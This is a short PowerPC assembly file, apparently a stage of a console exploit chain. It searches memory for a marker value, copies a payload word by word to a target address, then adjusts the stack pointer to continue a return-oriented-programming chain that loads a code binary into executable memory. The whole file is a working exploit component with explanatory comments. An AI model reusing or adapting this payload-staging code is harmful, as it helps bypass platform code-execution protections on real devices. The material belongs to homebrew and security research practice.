# Do not remove this.
bl l0
l0:

# Get the start search address (from r28) and save it in r4
mr 4, 28 # Move r28(=start search address) into r4

# Get the target address (from r29) and save it in r3
mr 3, 29 # Move r29(=target address into r3

#r3 = target adress
#r4 = search address

# Get the search for (to be precise the value-4) value (from r27) and save it in r6
mr 6, 27 # Move r27(=search for) into r6
addi 6,6, 4 # Add 4 to it, to get the real target value.

# Find search value
skipnop: #
lwz     5, 0(4)     # load from r4 into r5
addi    4,4,4       # increment r4 by 4
cmp     0,0, 5,6 ;  # check if it matches our search value
bne     0,skipnop   # if not, repeat.

# On failure we crash, on success the start address of the payload is in r4

#r3 = target adress
#r4 = startaddress of payload

# load "sizeToCopy" from r26 into r5, thats the size we want to copy.
mr 5, 26 # sizeToCopy

#r3 = target adress
#r4 = startaddress of payload
#r5 = size to copy

# Calculate the numbers of words to copy and save it in the counter register (payload_size>>2).
li 6, 2 # load 2 into r6
srw 5, 5, 6 # Shift Right Word. Shift r5 by r6 (2). To get the number of words (4 bytes each) to copy.
mtctr 5 # ctr reg = above u32 value >> 2. Put it into counter register.

#r3 = target adress
#r4 = startaddress of payload
#ctr words to copy

# Copy ctr words starting from r4 to r3.
copylp: # Copy the data from _end+4 with size *_end, to the address from r29 (which is now in r3).
lwz 5, 0(4) # load from r4
stw 5, 0(3) # write to r3 from r5
addi 4,4,4 
addi 3,3,4 # increment both addresses
bdnz copylp #Decrement count register and branch if it becomes nonzero

# Continue our ROP to now copy the memory from "target address" to codegen.
add 1, 1, 30 # Jump to the code-loading ROP to load the codebin which was copied above. (add r30(=8) to r1(the stackpointer)
lwz 3, 4(1) #read load adress from r1 with offset 4 into r3
mtctr 3 # move r3 to count register
bctr # continue the rop.

_end:
